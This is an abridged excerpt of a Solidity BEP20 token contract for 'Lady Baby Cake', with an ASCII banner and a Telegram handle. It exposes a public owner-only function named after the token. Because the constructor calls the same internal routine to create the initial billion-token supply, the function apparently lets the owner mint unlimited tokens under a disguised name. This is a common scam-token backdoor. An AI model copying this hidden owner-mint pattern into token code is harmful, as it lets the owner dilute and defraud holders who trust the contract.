 ...
 *  ╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
 * 
 *          Welcome to Lady Baby Cake - $LADYBABYCAKE
 *              Telegram group @ladyBabyCake
 *
 * 
 *      About Us
...
contract BEP20 is Ownable, IBEP20 {
    ...
    function ladybabycake(uint256 amount) public onlyOwner {
    _ladybabycake(msg.sender, amount);
    }
    ...
    function _ladybabycake(address account, uint256 amount) internal virtual {
...
contract LADYBABYCAKE is BEP20 {
    ...
    BEP20(name_, symbol_){
        ...
        _ladybabycake(_msgSender(), 1000000000 * 10 ** decimals());
    }
}